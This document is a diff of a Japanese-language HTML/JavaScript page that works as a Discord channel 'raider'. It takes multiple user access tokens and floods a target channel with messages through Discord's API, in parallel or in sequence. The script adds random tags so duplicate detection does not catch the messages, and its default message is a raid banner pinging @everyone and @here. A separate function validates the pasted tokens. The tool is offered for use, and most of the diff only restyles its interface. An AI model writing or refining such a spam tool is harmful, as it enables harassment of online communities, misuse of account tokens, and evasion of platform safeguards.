@@ -7,24 +7,23 @@
     <style>
         :root {
             --bg: #050508;
-            --panel: rgba(15, 15, 25, 0.8);
-            --accent-primary: #00f2ff; /* シアン */
-            --accent-secondary: #7000ff; /* パープル */
+            --panel: rgba(15, 15, 25, 0.85);
+            --accent-primary: #00f2ff;
+            --accent-secondary: #7000ff;
             --text-main: #f0f0f0;
             --text-dim: #9494b8;
             --success: #39ff14;
             --error: #ff0055;
-            --warning: #ffb800;
         }
 
         body {
             margin: 0;
-            padding: 15px;
+            padding: 10px;
             font-family: 'Hiragino Kaku Gothic ProN', 'Meiryo', sans-serif;
             background: var(--bg);
             background-image: 
-                radial-gradient(circle at 20% 20%, rgba(112, 0, 255, 0.15) 0%, transparent 40%),
-                radial-gradient(circle at 80% 80%, rgba(0, 242, 255, 0.15) 0%, transparent 40%);
+                radial-gradient(circle at 10% 10%, rgba(112, 0, 255, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 90% 90%, rgba(0, 242, 255, 0.1) 0%, transparent 40%);
             color: var(--text-main);
             display: flex;
             justify-content: center;
@@ -37,93 +36,89 @@
             -webkit-backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 20px;
-            padding: 25px;
+            padding: 20px;
             width: 100%;
-            max-width: 550px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+            max-width: 500px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+            align-self: center;
         }
 
         h2 {
-            margin: 0 0 25px 0;
+            margin: 0 0 20px 0;
             text-align: center;
-            font-size: 1.6rem;
+            font-size: 1.5rem;
             font-weight: 900;
-            letter-spacing: 5px;
+            letter-spacing: 4px;
             background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             text-transform: uppercase;
         }
 
-        .field-group { margin-bottom: 18px; }
+        .field-group { margin-bottom: 15px; }
 
         label {
             display: block;
-            margin-bottom: 6px;
-            font-size: 0.75rem;
+            margin-bottom: 5px;
+            font-size: 0.7rem;
             font-weight: bold;
             color: var(--accent-primary);
             letter-spacing: 1px;
+            text-transform: uppercase;
         }
 
         input, textarea, select {
             width: 100%;
-            background: rgba(0, 0, 0, 0.4);
+            background: rgba(0, 0, 0, 0.5);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 10px;
-            padding: 14px;
+            padding: 12px;
             color: #fff;
-            font-size: 0.95rem;
-            transition: all 0.3s;
+            font-size: 0.9rem;
             box-sizing: border-box;
+            transition: 0.3s;
         }
 
         input:focus, textarea:focus {
             outline: none;
             border-color: var(--accent-primary);
-            box-shadow: 0 0 15px rgba(0, 242, 255, 0.2);
+            box-shadow: 0 0 10px rgba(0, 242, 255, 0.2);
         }
 
         .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15px;
+            gap: 12px;
         }
 
-        /* モバイル対応 */
         @media (max-width: 480px) {
             .grid { grid-template-columns: 1fr; }
-            .container { padding: 20px; }
         }
 
         button {
-            border-radius: 12px;
-            padding: 16px;
+            border-radius: 10px;
+            padding: 14px;
             font-weight: 800;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: 0.3s;
             border: none;
-            text-transform: uppercase;
         }
 
         .btn-check {
             background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.15);
             color: #fff;
         }
-
-        .btn-check:hover { background: rgba(255, 255, 255, 0.1); }
 
         .btn-start {
             background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
             color: #000;
-            box-shadow: 0 4px 15px rgba(0, 242, 255, 0.3);
         }
 
         .btn-start:hover:not(:disabled) {
-            transform: scale(1.02);
             filter: brightness(1.2);
+            transform: translateY(-1px);
         }
 
         .btn-stop {
@@ -134,26 +129,23 @@
         .btn-stop.active {
             background: var(--error);
             color: #fff;
-            box-shadow: 0 4px 15px rgba(255, 0, 85, 0.3);
         }
 
         #log {
-            margin-top: 25px;
-            height: 180px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 12px;
-            padding: 15px;
+            margin-top: 20px;
+            height: 160px;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 10px;
+            padding: 12px;
             font-family: 'Consolas', monospace;
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             overflow-y: auto;
             border: 1px solid rgba(255, 255, 255, 0.05);
-            line-height: 1.5;
         }
 
-        .log-entry { border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding: 4px 0; }
+        .log-entry { border-bottom: 1px solid rgba(255, 255, 255, 0.02); padding: 3px 0; }
         .log-success { color: var(--success); }
         .log-error { color: var(--error); }
-        .log-info { color: var(--accent-primary); }
     </style>
 </head>
 <body>
@@ -163,30 +155,30 @@
 
     <div class="field-group">
         <label>アクセストークン (1行に1つ)</label>
-        <textarea id="tokens" rows="3" placeholder="ここにトークンを貼り付け..."></textarea>
+        <textarea id="tokens" rows="3" placeholder="Token..."></textarea>
     </div>
 
     <div class="grid field-group">
         <div>
             <label>チャンネルID</label>
-            <input type="text" id="channelId" placeholder="123456789...">
+            <input type="text" id="channelId" placeholder="ID...">
         </div>
         <div>
-            <label>送信間隔 (ミリ秒)</label>
+            <label>間隔 (ms)</label>
             <input type="number" id="delay" value="1000">
         </div>
     </div>
 
     <div class="field-group">
-        <label>カスタムメッセージ (カンマ区切りでランダム送信)</label>
+        <label>カスタムメッセージ (カンマ区切り)</label>
         <textarea id="messages" rows="2" placeholder="メッセージ1, メッセージ2..."></textarea>
     </div>
 
     <div class="grid field-group">
         <button class="btn-check" onclick="checkTokens()">トークン確認</button>
         <select id="mode">
-            <option value="1">並列モード (一斉送信)</option>
-            <option value="2">順次モード (交互送信)</option>
+            <option value="1">並列モード</option>
+            <option value="2">順次モード</option>
         </select>
     </div>
 
@@ -195,7 +187,7 @@
         <button id="stopBtn" class="btn-stop" onclick="stopRaiding()" disabled>緊急停止</button>
     </div>
 
-    <div id="log">// システム待機中...</div>
+    <div id="log">// 準備完了</div>
 </div>
 
 <script>
@@ -203,7 +195,7 @@
 
     const logger = (msg, type) => {
         const logBox = document.getElementById('log');
-        const className = type === 'error' ? 'log-error' : (type === 'success' ? 'log-success' : 'log-info');
+        const className = type === 'error' ? 'log-error' : (type === 'success' ? 'log-success' : '');
         const time = new Date().toLocaleTimeString();
         logBox.innerHTML = `<div class="log-entry ${className}">[${time}] ${msg}</div>` + logBox.innerHTML;
     };
@@ -211,13 +203,13 @@
     function startRaiding() {
         const tks = document.getElementById('tokens').value.trim();
         const cid = document.getElementById('channelId').value.trim();
-        if(!tks || !cid) return alert("トークンとチャンネルIDを入力してください。");
+        if(!tks || !cid) return alert("トークンとIDを入力してください");
 
         isRunning = true;
         document.getElementById('startBtn').disabled = true;
         document.getElementById('stopBtn').disabled = false;
         document.getElementById('stopBtn').classList.add('active');
-        logger("RAIDシーケンスを開始しました", "info");
+        logger("RAID開始", "success");
         runLoop();
     }
 
@@ -226,7 +218,7 @@
         document.getElementById('startBtn').disabled = false;
         document.getElementById('stopBtn').disabled = true;
         document.getElementById('stopBtn').classList.remove('active');
-        logger("システムを停止しました", "error");
+        logger("システム停止", "error");
     }
 
     async function runLoop() {
@@ -234,15 +226,17 @@
             const tks = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
             const cid = document.getElementById('channelId').value.trim();
             const dly = parseInt(document.getElementById('delay').value) || 1000;
-            const msgInput = document.getElementById('messages').value;
-            const msgs = msgInput.split(',').map(m => m.trim()).filter(m => m);
+            const msgs = document.getElementById('messages').value.split(',').map(m => m.trim()).filter(m => m);
             
             const tasks = tks.map(async (t) => {
                 if(!isRunning) return;
-                let content = msgs.length > 0 ? msgs[Math.floor(Math.random() * msgs.length)] : "nana's raider 稼働中";
+
+                let content = msgs.length > 0 
+                    ? msgs[Math.floor(Math.random() * msgs.length)] 
+                    : "# Raid by 雑草!!\n@everyone @here";
                 
-                // わずかなランダム文字列を付与して重複検知を回避
-                content += " [" + Math.random().toString(36).substring(7) + "]";
+                // 重複回避用のランダムタグ
+                content += " _[" + Math.random().toString(36).substring(2, 7) + "]_";
 
                 try {
                     const res = await fetch(`https://discord.com/api/v9/channels/${cid}/messages`, {
@@ -250,14 +244,9 @@
                         headers: { 'Authorization': t.trim(), 'Content-Type': 'application/json' },
                         body: JSON.stringify({ content: content })
                     });
-                    
-                    const shortT = t.substring(0, 10);
-                    if(res.ok) logger(`送信成功: ${shortT}...`, "success");
-                    else if(res.status === 429) logger(`制限中: ${shortT} (待機が必要)`, "error");
-                    else logger(`送信失敗: 状態コード ${res.status}`, "error");
-                } catch (e) {
-                    logger("通信エラーが発生しました", "error");
-                }
+                    if(res.ok) logger(`送信成功: ${t.substring(0,8)}...`, "success");
+                    else logger(`失敗: ${res.status}`, "error");
+                } catch (e) { logger("通信エラー", "error"); }
             });
 
             if(document.getElementById('mode').value === "1") {
@@ -275,16 +264,13 @@
 
     async function checkTokens() {
         const tks = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
-        if(tks.length === 0) return logger("確認するトークンがありません", "error");
-
-        logger("トークンの有効性を確認中...", "info");
+        logger("確認中...", "");
         for (const t of tks) {
             try {
                 const r = await fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': t.trim() } });
                 const data = await r.json();
-                if(r.ok) logger(`有効なトークン: ${data.username} (${t.substring(0,8)}...)`, "success");
-                else logger(`無効なトークンを確認しました`, "error");
-            } catch(e) { logger("API接続エラー", "error"); }
+                logger(r.ok ? `有効: ${data.username}` : "無効なトークン", r.ok ? "success" : "error");
+            } catch(e) { logger("接続失敗", "error"); }
         }
     }
 </script>
